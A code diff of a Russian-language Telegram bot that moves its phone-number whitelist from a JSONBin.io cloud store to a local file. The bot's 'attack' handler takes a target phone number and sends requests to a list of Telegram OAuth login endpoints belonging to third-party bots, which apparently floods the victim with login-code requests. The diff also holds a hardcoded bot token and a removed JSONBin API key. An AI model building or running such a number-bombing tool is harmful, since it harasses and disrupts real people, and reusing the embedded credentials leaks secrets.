@@ -3,15 +3,15 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 import requests
 import time
 import json
+import os
 
 BOT_TOKEN = '8768938960:AAGe5Pwh32P13XbwzXj7fzl5DVhYJLEIj0w'
 ADMIN_ID = 8434489753
 
-# ========== JSONBin.io КОНФИГ ==========
-API_KEY = '$2a$10$DWV0FhJBA3jXAX8HDms6MuALT9NBDhI5iQSX.ZYLpF4fYOWHq1Y0C'
-WHITELIST_BIN_ID = '69e29b0aaaba8821970e8018'
-
 bot = telebot.TeleBot(BOT_TOKEN)
+
+# Файл для хранения белого списка (сохраняется на Railway)
+WHITELIST_FILE = 'whitelist.json'
 
 ATTACK_URLS = [
     'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1',
@@ -26,38 +26,27 @@ ATTACK_URLS = [
     'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1'
 ]
 
-# ========== ФУНКЦИИ РАБОТЫ С JSONBin ==========
+# ========== РАБОТА С ФАЙЛОМ ==========
 def load_whitelist():
-    try:
-        url = f"https://api.jsonbin.io/v3/b/{WHITELIST_BIN_ID}/latest"
-        headers = {'X-Master-Key': API_KEY}
-        response = requests.get(url, headers=headers)
-        if response.status_code == 200:
-            data = response.json()
-            return data['record'].get('phones', [])
-        else:
+    if os.path.exists(WHITELIST_FILE):
+        try:
+            with open(WHITELIST_FILE, 'r') as f:
+                return json.load(f)
+        except:
             return []
-    except Exception as e:
-        print(f"Ошибка загрузки: {e}")
-        return []
+    return []
 
-def save_whitelist(whitelist):
+def save_whitelist(wl):
     try:
-        url = f"https://api.jsonbin.io/v3/b/{WHITELIST_BIN_ID}"
-        headers = {
-            'Content-Type': 'application/json',
-            'X-Master-Key': API_KEY
-        }
-        data = {'phones': whitelist}
-        response = requests.put(url, json=data, headers=headers)
-        return response.status_code == 200
-    except Exception as e:
-        print(f"Ошибка сохранения: {e}")
+        with open(WHITELIST_FILE, 'w') as f:
+            json.dump(wl, f, indent=2)
+        return True
+    except:
         return False
 
-# Загружаем белый список при старте
+# Загружаем список при старте
 whitelist = load_whitelist()
-print(f"📋 Загружено {len(whitelist)} номеров из облака")
+print(f"📋 Загружено {len(whitelist)} номеров из файла")
 
 def normalize_phone(phone):
     clean = ''.join(filter(str.isdigit, phone))
@@ -114,7 +103,7 @@ def handle_buttons(message):
             bot.send_message(message.chat.id, "📋 Пусто", reply_markup=get_main_menu(user_id))
     
     elif text == "➕ ДОБАВИТЬ" and is_admin(user_id):
-        bot.send_message(message.chat.id, "📝 Введи номер для добавления:")
+        bot.send_message(message.chat.id, "📝 Введи номер для добавления:\nПример: +79001234567")
         bot.register_next_step_handler(message, add_handler)
     
     elif text == "❌ УДАЛИТЬ" and is_admin(user_id):
@@ -132,7 +121,7 @@ def attack_handler(message):
     try:
         normalized = normalize_phone(phone)
         
-        # Проверяем белый список (свежая загрузка)
+        # Проверяем белый список
         current_whitelist = load_whitelist()
         if normalized in current_whitelist:
             bot.send_message(message.chat.id, f"⛔ АТАКА ОТМЕНЕНА!\nНомер {normalized} в белом списке!", reply_markup=get_main_menu(user_id))
@@ -169,7 +158,7 @@ def add_handler(message):
                 whitelist = current_whitelist
                 bot.send_message(message.chat.id, f"✅ {normalized} добавлен в белый список!", reply_markup=get_main_menu(user_id))
             else:
-                bot.send_message(message.chat.id, "❌ Ошибка сохранения в облако!", reply_markup=get_main_menu(user_id))
+                bot.send_message(message.chat.id, "❌ Ошибка сохранения!", reply_markup=get_main_menu(user_id))
         else:
             bot.send_message(message.chat.id, f"⚠️ {normalized} уже в списке", reply_markup=get_main_menu(user_id))
     except Exception as e:
@@ -188,7 +177,7 @@ def remove_handler(message):
                 whitelist = current_whitelist
                 bot.send_message(message.chat.id, f"✅ {normalized} удалён из белого списка!", reply_markup=get_main_menu(user_id))
             else:
-                bot.send_message(message.chat.id, "❌ Ошибка сохранения в облако!", reply_markup=get_main_menu(user_id))
+                bot.send_message(message.chat.id, "❌ Ошибка сохранения!", reply_markup=get_main_menu(user_id))
         else:
             bot.send_message(message.chat.id, f"⚠️ {normalized} не найден", reply_markup=get_main_menu(user_id))
     except Exception as e:
